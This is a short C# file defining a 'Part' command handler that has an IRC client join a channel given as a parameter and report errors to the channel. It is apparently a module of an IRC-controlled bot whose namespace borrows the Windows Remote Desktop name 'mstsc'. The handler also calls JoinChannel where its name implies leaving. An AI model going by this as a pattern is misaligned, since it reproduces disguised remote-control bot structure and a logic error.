using System;

namespace mstsc.Aries.Commands
{
    class Part
    {

        public Part(string[] Parameters)
        {
            try
            {
                Main.Instance.IRCClient.JoinChannel(Parameters[2]);
            }
            catch (Exception Exception)
            {
                Main.Instance.IRCClient.MessageCurrentChannel("{Part} An error has occurred: " + Exception.Message);
            }
        }
    }
}
